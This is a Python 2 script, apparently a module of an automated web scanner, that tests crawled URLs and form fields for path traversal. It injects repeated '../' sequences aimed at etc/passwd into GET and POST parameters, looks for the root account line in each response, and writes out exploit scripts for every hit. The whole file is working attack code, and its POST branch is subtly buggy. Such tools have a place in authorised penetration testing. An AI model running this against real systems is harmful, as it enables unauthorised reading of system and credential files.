import requests
from generator import render, generator
from utility import *

banner(DT)

feeds = ['etc/passwd']
nuggets = ['root:x:0:0:root:/root:/bin/bash']
depth = 10

DT_generator = generator(DT)


results = read_results()

links = set([])

for result in results:
    links.add(result['link'])

links = list(links)

# inject in url link
for link in links:
    method = 'GET'
    url = get_url(link)
    params = get_params(url)
    hit = False
    if (not len(params.keys())): continue
    for feed in feeds:
        i = 0
        while i < depth and not hit:
            if i == 0:
                value = '/' + feed
            else:
                value = i * '../' + feed
            for p in params:
                params[p] = value
                fullURL = generate_url_with_params(url, params)
                req = requests.get(fullURL)
                for nugget in nuggets:
                    if not hit and req.content.find(nugget) != -1:
                        hit = True
                        endpoint = url.path
                        scope, script = render[DT](endpoint,params,method)
                        DT_generator.updateScope(scope)
                        DT_generator.saveScript(script)                        
                        success_message(fullURL)
            i = i + 1


for result in results:
    link = result['link']
    input_names = result['content']
    method = 'POST'
    if(not len(input_names)): continue
    url = get_url(link)
    for feed in feeds:
        i = 0
        while i < depth and not hit:
            if i == 0:
                value = '/' + feed
            else:
                value = i * '../' + feed
                for p in input_names:
                    payload = {
                        p: feed
                    }
                    req = requests.post(link, data=payload)
                    for nugget in nuggets:
                        if req.content.find(nugget) != -1:
                            endpoint = url.path
                            params = payload
                            scope, script = render[DT](endpoint, params, method)
                            DT_generator.updateScope(scope)
                            DT_generator.saveScript(script)
                            success_message(link + '\t' + json.dumps(payload))
    
DT_generator.saveScope()

print '\n'
